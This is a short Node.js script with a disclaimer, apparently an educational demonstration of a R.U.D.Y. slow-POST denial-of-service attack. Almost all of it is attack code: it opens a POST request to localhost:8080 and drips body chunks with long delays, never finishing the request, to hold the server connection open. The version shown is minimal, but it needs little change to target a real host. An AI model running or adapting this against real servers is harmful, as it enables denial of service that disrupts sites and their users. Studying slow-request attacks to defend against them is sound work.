// Created January 26th, 2024 - By: Devon Griffith A.K.A. rootPHAGE / 我爱数据
// Run on Node.js in Windows [ Node <path to file>\RUDY.js ]
// This script demonstrates how a R.U.D.Y attack works in Node.js

const http = require('http'); // Import the HTTP module for our HTTP requests

const options = {
  hostname: 'localhost', // Target hostname is ourselves for demonstration
  port: 8080,           // Target port
  path: '/submit',      // Target path on the server
  method: 'POST',       // Use the HTTP POST method (not GET like last time)
  headers: {
    'Content-Type': 'application/x-www-form-urlencoded', // Content type header
  }
};

const req = http.request(options, (res) => { // Create the HTTP request
  console.log(`STATUS: ${res.statusCode}`); // Log response status
  res.setEncoding('utf8');                  // Set encoding (ustf-8 is standard)
  res.on('data', (chunk) => {               // Handle response data as chunks
    console.log(`BODY: ${chunk}`);
  });
  res.on('end', () => {                     // Handle the end of the networks response
    console.log('No more data in response.');
  });
});

req.on('error', (e) => {                    // Handle if the request comes back as an error
  console.error(`problem with request: ${e.message}`);
});

// Send the request body in small chunks with delays
req.write('data=1');
setTimeout(() => { req.write('data=2'); }, 10000); // Delay the next piece of data
// Continue to delay and send data, never completing the request - This keeps the connection "open."


// DO NOT USE THIS SCRIPT MALICIOUSLY - PROVIDED FOR EDUCATIONAL PURPOSES ONLY
